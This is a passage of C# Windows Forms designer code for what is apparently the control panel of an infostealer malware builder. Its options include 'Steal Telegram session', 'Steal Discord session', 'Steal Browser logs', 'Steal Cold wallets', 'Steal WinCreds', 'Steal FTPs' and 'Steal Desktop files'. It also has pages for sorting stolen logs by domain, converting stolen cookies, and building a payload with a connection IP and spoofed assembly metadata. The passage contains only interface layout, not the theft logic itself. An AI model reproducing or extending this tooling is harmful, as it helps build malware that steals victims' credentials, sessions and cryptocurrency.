			this.stealDiscordLbl.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.stealDiscordLbl.Location = new global::System.Drawing.Point(325, 230);
			this.stealDiscordLbl.Name = "stealDiscordLbl";
			this.stealDiscordLbl.Size = new global::System.Drawing.Size(222, 22);
			this.stealDiscordLbl.Style = global::MetroSet_UI.Design.Style.Dark;
			this.stealDiscordLbl.StyleManager = this.mainStyle;
			this.stealDiscordLbl.TabIndex = 37;
			this.stealDiscordLbl.Text = "Steal Discord session:";
			this.stealDiscordLbl.TextAlign = global::System.Drawing.ContentAlignment.MiddleLeft;
			this.stealDiscordLbl.ThemeAuthor = "Narwin";
			this.stealDiscordLbl.ThemeName = "MetroDark";
			this.stealTelegram.BackColor = global::System.Drawing.Color.Transparent;
			this.stealTelegram.BackgroundColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.stealTelegram.BorderColor = global::System.Drawing.Color.FromArgb(155, 155, 155);
			this.stealTelegram.Checked = true;
			this.stealTelegram.CheckSignColor = global::System.Drawing.Color.FromArgb(65, 177, 225);
			this.stealTelegram.CheckState = global::MetroSet_UI.Enums.CheckState.Checked;
			this.stealTelegram.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.stealTelegram.DisabledBorderColor = global::System.Drawing.Color.FromArgb(85, 85, 85);
			this.stealTelegram.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.stealTelegram.Location = new global::System.Drawing.Point(790, 30);
			this.stealTelegram.Name = "stealTelegram";
			this.stealTelegram.SignStyle = global::MetroSet_UI.Enums.SignStyle.Sign;
			this.stealTelegram.Size = new global::System.Drawing.Size(18, 16);
			this.stealTelegram.Style = global::MetroSet_UI.Design.Style.Dark;
			this.stealTelegram.StyleManager = this.mainStyle;
			this.stealTelegram.TabIndex = 36;
			this.stealTelegram.ThemeAuthor = "Narwin";
			this.stealTelegram.ThemeName = "MetroDark";
			this.stealTelegramLbl.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.stealTelegramLbl.Location = new global::System.Drawing.Point(325, 30);
			this.stealTelegramLbl.Name = "stealTelegramLbl";
			this.stealTelegramLbl.Size = new global::System.Drawing.Size(222, 22);
			this.stealTelegramLbl.Style = global::MetroSet_UI.Design.Style.Dark;
			this.stealTelegramLbl.StyleManager = this.mainStyle;
			this.stealTelegramLbl.TabIndex = 35;
			this.stealTelegramLbl.Text = "Steal Telegram session:";
			this.stealTelegramLbl.TextAlign = global::System.Drawing.ContentAlignment.MiddleLeft;
			this.stealTelegramLbl.ThemeAuthor = "Narwin";
			this.stealTelegramLbl.ThemeName = "MetroDark";
			this.stealDesktop.BackColor = global::System.Drawing.Color.Transparent;
			this.stealDesktop.BackgroundColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.stealDesktop.BorderColor = global::System.Drawing.Color.FromArgb(155, 155, 155);
			this.stealDesktop.Checked = true;
			this.stealDesktop.CheckSignColor = global::System.Drawing.Color.FromArgb(65, 177, 225);
			this.stealDesktop.CheckState = global::MetroSet_UI.Enums.CheckState.Checked;
			this.stealDesktop.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.stealDesktop.DisabledBorderColor = global::System.Drawing.Color.FromArgb(85, 85, 85);
			this.stealDesktop.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.stealDesktop.Location = new global::System.Drawing.Point(790, 270);
			this.stealDesktop.Name = "stealDesktop";
			this.stealDesktop.SignStyle = global::MetroSet_UI.Enums.SignStyle.Sign;
			this.stealDesktop.Size = new global::System.Drawing.Size(18, 16);
			this.stealDesktop.Style = global::MetroSet_UI.Design.Style.Dark;
			this.stealDesktop.StyleManager = this.mainStyle;
			this.stealDesktop.TabIndex = 34;
			this.stealDesktop.ThemeAuthor = "Narwin";
			this.stealDesktop.ThemeName = "MetroDark";
			this.stealFTPs.BackColor = global::System.Drawing.Color.Transparent;
			this.stealFTPs.BackgroundColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.stealFTPs.BorderColor = global::System.Drawing.Color.FromArgb(155, 155, 155);
			this.stealFTPs.Checked = true;
			this.stealFTPs.CheckSignColor = global::System.Drawing.Color.FromArgb(65, 177, 225);
			this.stealFTPs.CheckState = global::MetroSet_UI.Enums.CheckState.Checked;
			this.stealFTPs.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.stealFTPs.DisabledBorderColor = global::System.Drawing.Color.FromArgb(85, 85, 85);
			this.stealFTPs.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.stealFTPs.Location = new global::System.Drawing.Point(790, 190);
			this.stealFTPs.Name = "stealFTPs";
			this.stealFTPs.SignStyle = global::MetroSet_UI.Enums.SignStyle.Sign;
			this.stealFTPs.Size = new global::System.Drawing.Size(18, 16);
			this.stealFTPs.Style = global::MetroSet_UI.Design.Style.Dark;
			this.stealFTPs.StyleManager = this.mainStyle;
			this.stealFTPs.TabIndex = 33;
			this.stealFTPs.ThemeAuthor = "Narwin";
			this.stealFTPs.ThemeName = "MetroDark";
			this.stealWinCreds.BackColor = global::System.Drawing.Color.Transparent;
			this.stealWinCreds.BackgroundColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.stealWinCreds.BorderColor = global::System.Drawing.Color.FromArgb(155, 155, 155);
			this.stealWinCreds.Checked = true;
			this.stealWinCreds.CheckSignColor = global::System.Drawing.Color.FromArgb(65, 177, 225);
			this.stealWinCreds.CheckState = global::MetroSet_UI.Enums.CheckState.Checked;
			this.stealWinCreds.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.stealWinCreds.DisabledBorderColor = global::System.Drawing.Color.FromArgb(85, 85, 85);
			this.stealWinCreds.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.stealWinCreds.Location = new global::System.Drawing.Point(790, 150);
			this.stealWinCreds.Name = "stealWinCreds";
			this.stealWinCreds.SignStyle = global::MetroSet_UI.Enums.SignStyle.Sign;
			this.stealWinCreds.Size = new global::System.Drawing.Size(18, 16);
			this.stealWinCreds.Style = global::MetroSet_UI.Design.Style.Dark;
			this.stealWinCreds.StyleManager = this.mainStyle;
			this.stealWinCreds.TabIndex = 32;
			this.stealWinCreds.ThemeAuthor = "Narwin";
			this.stealWinCreds.ThemeName = "MetroDark";
			this.stealWallets.BackColor = global::System.Drawing.Color.Transparent;
			this.stealWallets.BackgroundColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.stealWallets.BorderColor = global::System.Drawing.Color.FromArgb(155, 155, 155);
			this.stealWallets.Checked = true;
			this.stealWallets.CheckSignColor = global::System.Drawing.Color.FromArgb(65, 177, 225);
			this.stealWallets.CheckState = global::MetroSet_UI.Enums.CheckState.Checked;
			this.stealWallets.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.stealWallets.DisabledBorderColor = global::System.Drawing.Color.FromArgb(85, 85, 85);
			this.stealWallets.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.stealWallets.Location = new global::System.Drawing.Point(790, 110);
			this.stealWallets.Name = "stealWallets";
			this.stealWallets.SignStyle = global::MetroSet_UI.Enums.SignStyle.Sign;
			this.stealWallets.Size = new global::System.Drawing.Size(18, 16);
			this.stealWallets.Style = global::MetroSet_UI.Design.Style.Dark;
			this.stealWallets.StyleManager = this.mainStyle;
			this.stealWallets.TabIndex = 31;
			this.stealWallets.ThemeAuthor = "Narwin";
			this.stealWallets.ThemeName = "MetroDark";
			this.stealLogs.BackColor = global::System.Drawing.Color.Transparent;
			this.stealLogs.BackgroundColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.stealLogs.BorderColor = global::System.Drawing.Color.FromArgb(155, 155, 155);
			this.stealLogs.Checked = true;
			this.stealLogs.CheckSignColor = global::System.Drawing.Color.FromArgb(65, 177, 225);
			this.stealLogs.CheckState = global::MetroSet_UI.Enums.CheckState.Checked;
			this.stealLogs.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.stealLogs.DisabledBorderColor = global::System.Drawing.Color.FromArgb(85, 85, 85);
			this.stealLogs.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.stealLogs.Location = new global::System.Drawing.Point(790, 70);
			this.stealLogs.Name = "stealLogs";
			this.stealLogs.SignStyle = global::MetroSet_UI.Enums.SignStyle.Sign;
			this.stealLogs.Size = new global::System.Drawing.Size(18, 16);
			this.stealLogs.Style = global::MetroSet_UI.Design.Style.Dark;
			this.stealLogs.StyleManager = this.mainStyle;
			this.stealLogs.TabIndex = 30;
			this.stealLogs.ThemeAuthor = "Narwin";
			this.stealLogs.ThemeName = "MetroDark";
			this.desktopExtTb.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.desktopExtTb.BorderStyle = global::System.Windows.Forms.BorderStyle.FixedSingle;
			this.desktopExtTb.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.desktopExtTb.ForeColor = global::System.Drawing.Color.FromArgb(170, 170, 170);
			this.desktopExtTb.Location = new global::System.Drawing.Point(325, 476);
			this.desktopExtTb.Name = "desktopExtTb";
			this.desktopExtTb.Size = new global::System.Drawing.Size(310, 22);
			this.desktopExtTb.TabIndex = 29;
			this.desktopExtTb.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Center;
			this.addDesktopExtBtn.BackColor = global::System.Drawing.Color.FromArgb(35, 147, 195);
			this.addDesktopExtBtn.FlatAppearance.BorderSize = 0;
			this.addDesktopExtBtn.FlatStyle = global::System.Windows.Forms.FlatStyle.Popup;
			this.addDesktopExtBtn.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.addDesktopExtBtn.Location = new global::System.Drawing.Point(641, 470);
			this.addDesktopExtBtn.Name = "addDesktopExtBtn";
			this.addDesktopExtBtn.Size = new global::System.Drawing.Size(172, 32);
			this.addDesktopExtBtn.TabIndex = 28;
			this.addDesktopExtBtn.Text = "Add";
			this.addDesktopExtBtn.UseVisualStyleBackColor = false;
			this.desktopExtList.BackColor = global::System.Drawing.Color.FromArgb(35, 35, 35);
			this.desktopExtList.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.desktopExtList.ContextMenuStrip = this.desktopExtContextMenu;
			this.desktopExtList.Cursor = global::System.Windows.Forms.Cursors.Default;
			this.desktopExtList.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.desktopExtList.ForeColor = global::System.Drawing.Color.FromArgb(170, 170, 170);
			this.desktopExtList.ItemHeight = 16;
			this.desktopExtList.Location = new global::System.Drawing.Point(325, 310);
			this.desktopExtList.Name = "desktopExtList";
			this.desktopExtList.ScrollAlwaysVisible = true;
			this.desktopExtList.Size = new global::System.Drawing.Size(488, 160);
			this.desktopExtList.TabIndex = 27;
			this.desktopExtContextMenu.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.deleteToolStripMenuItem
			});
			this.desktopExtContextMenu.Name = "desktopExtContextMenu";
			this.desktopExtContextMenu.Size = new global::System.Drawing.Size(108, 26);
			this.deleteToolStripMenuItem.Name = "deleteToolStripMenuItem";
			this.deleteToolStripMenuItem.Size = new global::System.Drawing.Size(107, 22);
			this.deleteToolStripMenuItem.Text = "Delete";
			this.deleteToolStripMenuItem.Click += new global::System.EventHandler(this.DeleteToolStripMenuItem_Click);
			this.stealDesktopLbl.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.stealDesktopLbl.Location = new global::System.Drawing.Point(325, 270);
			this.stealDesktopLbl.Name = "stealDesktopLbl";
			this.stealDesktopLbl.Size = new global::System.Drawing.Size(148, 22);
			this.stealDesktopLbl.Style = global::MetroSet_UI.Design.Style.Dark;
			this.stealDesktopLbl.StyleManager = this.mainStyle;
			this.stealDesktopLbl.TabIndex = 26;
			this.stealDesktopLbl.Text = "Steal Desktop files:";
			this.stealDesktopLbl.TextAlign = global::System.Drawing.ContentAlignment.MiddleLeft;
			this.stealDesktopLbl.ThemeAuthor = "Narwin";
			this.stealDesktopLbl.ThemeName = "MetroDark";
			this.stealFTPsLbl.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.stealFTPsLbl.Location = new global::System.Drawing.Point(325, 190);
			this.stealFTPsLbl.Name = "stealFTPsLbl";
			this.stealFTPsLbl.Size = new global::System.Drawing.Size(148, 22);
			this.stealFTPsLbl.Style = global::MetroSet_UI.Design.Style.Dark;
			this.stealFTPsLbl.StyleManager = this.mainStyle;
			this.stealFTPsLbl.TabIndex = 24;
			this.stealFTPsLbl.Text = "Steal FTPs:";
			this.stealFTPsLbl.TextAlign = global::System.Drawing.ContentAlignment.MiddleLeft;
			this.stealFTPsLbl.ThemeAuthor = "Narwin";
			this.stealFTPsLbl.ThemeName = "MetroDark";
			this.stealWinCredsLbl.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.stealWinCredsLbl.Location = new global::System.Drawing.Point(325, 150);
			this.stealWinCredsLbl.Name = "stealWinCredsLbl";
			this.stealWinCredsLbl.Size = new global::System.Drawing.Size(148, 22);
			this.stealWinCredsLbl.Style = global::MetroSet_UI.Design.Style.Dark;
			this.stealWinCredsLbl.StyleManager = this.mainStyle;
			this.stealWinCredsLbl.TabIndex = 22;
			this.stealWinCredsLbl.Text = "Steal WinCreds:";
			this.stealWinCredsLbl.TextAlign = global::System.Drawing.ContentAlignment.MiddleLeft;
			this.stealWinCredsLbl.ThemeAuthor = "Narwin";
			this.stealWinCredsLbl.ThemeName = "MetroDark";
			this.stealWalletsLbl.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.stealWalletsLbl.Location = new global::System.Drawing.Point(325, 110);
			this.stealWalletsLbl.Name = "stealWalletsLbl";
			this.stealWalletsLbl.Size = new global::System.Drawing.Size(148, 22);
			this.stealWalletsLbl.Style = global::MetroSet_UI.Design.Style.Dark;
			this.stealWalletsLbl.StyleManager = this.mainStyle;
			this.stealWalletsLbl.TabIndex = 20;
			this.stealWalletsLbl.Text = "Steal Cold wallets:";
			this.stealWalletsLbl.TextAlign = global::System.Drawing.ContentAlignment.MiddleLeft;
			this.stealWalletsLbl.ThemeAuthor = "Narwin";
			this.stealWalletsLbl.ThemeName = "MetroDark";
			this.stealLogsLbl.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.stealLogsLbl.Location = new global::System.Drawing.Point(325, 70);
			this.stealLogsLbl.Name = "stealLogsLbl";
			this.stealLogsLbl.Size = new global::System.Drawing.Size(148, 22);
			this.stealLogsLbl.Style = global::MetroSet_UI.Design.Style.Dark;
			this.stealLogsLbl.StyleManager = this.mainStyle;
			this.stealLogsLbl.TabIndex = 18;
			this.stealLogsLbl.Text = "Steal Browser logs:";
			this.stealLogsLbl.TextAlign = global::System.Drawing.ContentAlignment.MiddleLeft;
			this.stealLogsLbl.ThemeAuthor = "Narwin";
			this.stealLogsLbl.ThemeName = "MetroDark";
			this.domainSorterPage.BaseColor = global::System.Drawing.Color.FromArgb(32, 32, 32);
			this.domainSorterPage.Controls.Add(this.metroSetDivider2);
			this.domainSorterPage.Controls.Add(this.accountFormatterLbl);
			this.domainSorterPage.Controls.Add(this.domainFilterLbl);
			this.domainSorterPage.Controls.Add(this.domainFilter);
			this.domainSorterPage.Controls.Add(this.browserDirBtn);
			this.domainSorterPage.Controls.Add(this.logsLoading);
			this.domainSorterPage.Controls.Add(this.accountFormatter);
			this.domainSorterPage.Controls.Add(this.domainsLb);
			this.domainSorterPage.Controls.Add(this.pathToLogsLbl);
			this.domainSorterPage.Controls.Add(this.pathToLogs);
			this.domainSorterPage.ImageIndex = 0;
			this.domainSorterPage.ImageKey = null;
			this.domainSorterPage.Location = new global::System.Drawing.Point(4, 42);
			this.domainSorterPage.Name = "domainSorterPage";
			this.domainSorterPage.Size = new global::System.Drawing.Size(1202, 542);
			this.domainSorterPage.Style = global::MetroSet_UI.Design.Style.Dark;
			this.domainSorterPage.StyleManager = this.mainStyle;
			this.domainSorterPage.TabIndex = 3;
			this.domainSorterPage.Text = "Domain Sorter";
			this.domainSorterPage.ThemeAuthor = "Narwin";
			this.domainSorterPage.ThemeName = "MetroDark";
			this.domainSorterPage.ToolTipText = null;
			this.metroSetDivider2.Location = new global::System.Drawing.Point(297, 363);
			this.metroSetDivider2.Name = "metroSetDivider2";
			this.metroSetDivider2.Orientation = global::MetroSet_UI.Enums.DividerStyle.Horizontal;
			this.metroSetDivider2.Size = new global::System.Drawing.Size(603, 4);
			this.metroSetDivider2.Style = global::MetroSet_UI.Design.Style.Dark;
			this.metroSetDivider2.StyleManager = this.mainStyle;
			this.metroSetDivider2.TabIndex = 56;
			this.metroSetDivider2.Text = "metroSetDivider1";
			this.metroSetDivider2.ThemeAuthor = "Narwin";
			this.metroSetDivider2.ThemeName = "MetroDark";
			this.metroSetDivider2.Thickness = 1;
			this.accountFormatterLbl.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.accountFormatterLbl.Location = new global::System.Drawing.Point(297, 422);
			this.accountFormatterLbl.Name = "accountFormatterLbl";
			this.accountFormatterLbl.Size = new global::System.Drawing.Size(148, 23);
			this.accountFormatterLbl.Style = global::MetroSet_UI.Design.Style.Dark;
			this.accountFormatterLbl.StyleManager = this.mainStyle;
			this.accountFormatterLbl.TabIndex = 55;
			this.accountFormatterLbl.Text = "Formatter:";
			this.accountFormatterLbl.ThemeAuthor = "Narwin";
			this.accountFormatterLbl.ThemeName = "MetroDark";
			this.domainFilterLbl.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.domainFilterLbl.Location = new global::System.Drawing.Point(297, 372);
			this.domainFilterLbl.Name = "domainFilterLbl";
			this.domainFilterLbl.Size = new global::System.Drawing.Size(148, 23);
			this.domainFilterLbl.Style = global::MetroSet_UI.Design.Style.Dark;
			this.domainFilterLbl.StyleManager = this.mainStyle;
			this.domainFilterLbl.TabIndex = 54;
			this.domainFilterLbl.Text = "Domain Filter:";
			this.domainFilterLbl.ThemeAuthor = "Narwin";
			this.domainFilterLbl.ThemeName = "MetroDark";
			this.domainFilter.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.domainFilter.BorderStyle = global::System.Windows.Forms.BorderStyle.FixedSingle;
			this.domainFilter.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.domainFilter.ForeColor = global::System.Drawing.Color.FromArgb(170, 170, 170);
			this.domainFilter.Location = new global::System.Drawing.Point(297, 397);
			this.domainFilter.Name = "domainFilter";
			this.domainFilter.Size = new global::System.Drawing.Size(603, 22);
			this.domainFilter.TabIndex = 53;
			this.domainFilter.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Center;
			this.browserDirBtn.BackColor = global::System.Drawing.Color.FromArgb(35, 147, 195);
			this.browserDirBtn.FlatAppearance.BorderSize = 0;
			this.browserDirBtn.FlatStyle = global::System.Windows.Forms.FlatStyle.Popup;
			this.browserDirBtn.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.browserDirBtn.Location = new global::System.Drawing.Point(864, 162);
			this.browserDirBtn.Name = "browserDirBtn";
			this.browserDirBtn.Size = new global::System.Drawing.Size(36, 22);
			this.browserDirBtn.TabIndex = 52;
			this.browserDirBtn.Text = "*";
			this.browserDirBtn.UseVisualStyleBackColor = false;
			this.logsLoading.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.logsLoading.Location = new global::System.Drawing.Point(563, 478);
			this.logsLoading.Name = "logsLoading";
			this.logsLoading.Size = new global::System.Drawing.Size(86, 23);
			this.logsLoading.Style = global::MetroSet_UI.Design.Style.Dark;
			this.logsLoading.StyleManager = this.mainStyle;
			this.logsLoading.TabIndex = 35;
			this.logsLoading.Text = "Loading...";
			this.logsLoading.ThemeAuthor = "Narwin";
			this.logsLoading.ThemeName = "MetroDark";
			this.accountFormatter.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.accountFormatter.BorderStyle = global::System.Windows.Forms.BorderStyle.FixedSingle;
			this.accountFormatter.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.accountFormatter.ForeColor = global::System.Drawing.Color.FromArgb(170, 170, 170);
			this.accountFormatter.Location = new global::System.Drawing.Point(297, 448);
			this.accountFormatter.Name = "accountFormatter";
			this.accountFormatter.Size = new global::System.Drawing.Size(603, 22);
			this.accountFormatter.TabIndex = 34;
			this.accountFormatter.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Center;
			this.domainsLb.BackColor = global::System.Drawing.Color.FromArgb(35, 35, 35);
			this.domainsLb.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.domainsLb.ContextMenuStrip = this.domainContextMenu;
			this.domainsLb.Cursor = global::System.Windows.Forms.Cursors.Default;
			this.domainsLb.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.domainsLb.ForeColor = global::System.Drawing.Color.FromArgb(170, 170, 170);
			this.domainsLb.ItemHeight = 16;
			this.domainsLb.Location = new global::System.Drawing.Point(297, 191);
			this.domainsLb.Name = "domainsLb";
			this.domainsLb.ScrollAlwaysVisible = true;
			this.domainsLb.Size = new global::System.Drawing.Size(603, 160);
			this.domainsLb.TabIndex = 33;
			this.domainContextMenu.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.saveToolStripMenuItem
			});
			this.domainContextMenu.Name = "domainContextMenu";
			this.domainContextMenu.Size = new global::System.Drawing.Size(99, 26);
			this.saveToolStripMenuItem.Name = "saveToolStripMenuItem";
			this.saveToolStripMenuItem.Size = new global::System.Drawing.Size(98, 22);
			this.saveToolStripMenuItem.Text = "Save";
			this.saveToolStripMenuItem.Click += new global::System.EventHandler(this.SaveToolStripMenuItem_Click);
			this.pathToLogsLbl.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.pathToLogsLbl.Location = new global::System.Drawing.Point(297, 137);
			this.pathToLogsLbl.Name = "pathToLogsLbl";
			this.pathToLogsLbl.Size = new global::System.Drawing.Size(148, 23);
			this.pathToLogsLbl.Style = global::MetroSet_UI.Design.Style.Dark;
			this.pathToLogsLbl.StyleManager = this.mainStyle;
			this.pathToLogsLbl.TabIndex = 32;
			this.pathToLogsLbl.Text = "Logs directory:";
			this.pathToLogsLbl.ThemeAuthor = "Narwin";
			this.pathToLogsLbl.ThemeName = "MetroDark";
			this.pathToLogs.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.pathToLogs.BorderStyle = global::System.Windows.Forms.BorderStyle.FixedSingle;
			this.pathToLogs.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.pathToLogs.ForeColor = global::System.Drawing.Color.FromArgb(170, 170, 170);
			this.pathToLogs.Location = new global::System.Drawing.Point(297, 163);
			this.pathToLogs.Name = "pathToLogs";
			this.pathToLogs.ReadOnly = true;
			this.pathToLogs.Size = new global::System.Drawing.Size(561, 22);
			this.pathToLogs.TabIndex = 31;
			this.pathToLogs.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Center;
			this.cookieConvertPage.BaseColor = global::System.Drawing.Color.FromArgb(32, 32, 32);
			this.cookieConvertPage.Controls.Add(this.jsonBtn);
			this.cookieConvertPage.Controls.Add(this.netScapeBtn);
			this.cookieConvertPage.ImageIndex = 0;
			this.cookieConvertPage.ImageKey = null;
			this.cookieConvertPage.Location = new global::System.Drawing.Point(4, 42);
			this.cookieConvertPage.Name = "cookieConvertPage";
			this.cookieConvertPage.Size = new global::System.Drawing.Size(1202, 542);
			this.cookieConvertPage.Style = global::MetroSet_UI.Design.Style.Dark;
			this.cookieConvertPage.StyleManager = this.mainStyle;
			this.cookieConvertPage.TabIndex = 6;
			this.cookieConvertPage.Text = "Cookie Converter";
			this.cookieConvertPage.ThemeAuthor = "Narwin";
			this.cookieConvertPage.ThemeName = "MetroDark";
			this.cookieConvertPage.ToolTipText = null;
			this.jsonBtn.BackColor = global::System.Drawing.Color.FromArgb(35, 147, 195);
			this.jsonBtn.FlatAppearance.BorderSize = 0;
			this.jsonBtn.FlatStyle = global::System.Windows.Forms.FlatStyle.Popup;
			this.jsonBtn.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.jsonBtn.Location = new global::System.Drawing.Point(513, 287);
			this.jsonBtn.Name = "jsonBtn";
			this.jsonBtn.Size = new global::System.Drawing.Size(185, 32);
			this.jsonBtn.TabIndex = 11;
			this.jsonBtn.Text = "Convert to Netscape";
			this.jsonBtn.UseVisualStyleBackColor = false;
			this.netScapeBtn.BackColor = global::System.Drawing.Color.FromArgb(35, 147, 195);
			this.netScapeBtn.FlatAppearance.BorderSize = 0;
			this.netScapeBtn.FlatStyle = global::System.Windows.Forms.FlatStyle.Popup;
			this.netScapeBtn.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.netScapeBtn.Location = new global::System.Drawing.Point(513, 192);
			this.netScapeBtn.Name = "netScapeBtn";
			this.netScapeBtn.Size = new global::System.Drawing.Size(185, 32);
			this.netScapeBtn.TabIndex = 10;
			this.netScapeBtn.Text = "Convert to JSON";
			this.netScapeBtn.UseVisualStyleBackColor = false;
			this.builderPage.BaseColor = global::System.Drawing.Color.FromArgb(32, 32, 32);
			this.builderPage.Controls.Add(this.assemblyIPLbl);
			this.builderPage.Controls.Add(this.assemblyIP);
			this.builderPage.Controls.Add(this.assemblyOpenIconBtn);
			this.builderPage.Controls.Add(this.buildCreating);
			this.builderPage.Controls.Add(this.assemblySourceIDLbl);
			this.builderPage.Controls.Add(this.assemblySourceID);
			this.builderPage.Controls.Add(this.assemblyPlatformLbl);
			this.builderPage.Controls.Add(this.assemblyPlatform);
			this.builderPage.Controls.Add(this.assemblyIconLbl);
			this.builderPage.Controls.Add(this.assemblyIcon);
			this.builderPage.Controls.Add(this.assemblyCopyrightLbl);
			this.builderPage.Controls.Add(this.assemblyCopyright);
			this.builderPage.Controls.Add(this.assemblyVersionLbl);
			this.builderPage.Controls.Add(this.assemblyVersion);
			this.builderPage.Controls.Add(this.assemblyCompanyLbl);
			this.builderPage.Controls.Add(this.assemblyCompany);
			this.builderPage.Controls.Add(this.createBuildBtn);
			this.builderPage.Controls.Add(this.assemblyDescriptionLbl);
			this.builderPage.Controls.Add(this.assemblyDescription);
			this.builderPage.ImageIndex = 0;
			this.builderPage.ImageKey = null;
			this.builderPage.Location = new global::System.Drawing.Point(4, 42);
			this.builderPage.Name = "builderPage";
			this.builderPage.Size = new global::System.Drawing.Size(1202, 542);
			this.builderPage.Style = global::MetroSet_UI.Design.Style.Dark;
			this.builderPage.StyleManager = this.mainStyle;
			this.builderPage.TabIndex = 4;
			this.builderPage.Text = "Builder";
			this.builderPage.ThemeAuthor = "Narwin";
			this.builderPage.ThemeName = "MetroDark";
			this.builderPage.ToolTipText = null;
			this.assemblyIPLbl.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.assemblyIPLbl.Location = new global::System.Drawing.Point(320, 440);
			this.assemblyIPLbl.Name = "assemblyIPLbl";
			this.assemblyIPLbl.Size = new global::System.Drawing.Size(191, 23);
			this.assemblyIPLbl.Style = global::MetroSet_UI.Design.Style.Dark;
			this.assemblyIPLbl.StyleManager = this.mainStyle;
			this.assemblyIPLbl.TabIndex = 53;
			this.assemblyIPLbl.Text = "Assembly Connection IP:";
			this.assemblyIPLbl.ThemeAuthor = "Narwin";
			this.assemblyIPLbl.ThemeName = "MetroDark";
			this.assemblyIP.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.assemblyIP.BorderStyle = global::System.Windows.Forms.BorderStyle.FixedSingle;
			this.assemblyIP.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.assemblyIP.ForeColor = global::System.Drawing.Color.FromArgb(170, 170, 170);
			this.assemblyIP.Location = new global::System.Drawing.Point(320, 465);
			this.assemblyIP.Name = "assemblyIP";
			this.assemblyIP.Size = new global::System.Drawing.Size(561, 22);
			this.assemblyIP.TabIndex = 52;
			this.assemblyIP.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Center;
			this.assemblyOpenIconBtn.BackColor = global::System.Drawing.Color.FromArgb(35, 147, 195);
			this.assemblyOpenIconBtn.FlatAppearance.BorderSize = 0;
			this.assemblyOpenIconBtn.FlatStyle = global::System.Windows.Forms.FlatStyle.Popup;
			this.assemblyOpenIconBtn.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.assemblyOpenIconBtn.Location = new global::System.Drawing.Point(845, 300);
			this.assemblyOpenIconBtn.Name = "assemblyOpenIconBtn";
			this.assemblyOpenIconBtn.Size = new global::System.Drawing.Size(36, 22);
			this.assemblyOpenIconBtn.TabIndex = 51;
			this.assemblyOpenIconBtn.Text = "*";
			this.assemblyOpenIconBtn.UseVisualStyleBackColor = false;
			this.buildCreating.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.buildCreating.Location = new global::System.Drawing.Point(693, 490);
			this.buildCreating.Name = "buildCreating";
			this.buildCreating.Size = new global::System.Drawing.Size(86, 32);
			this.buildCreating.Style = global::MetroSet_UI.Design.Style.Dark;
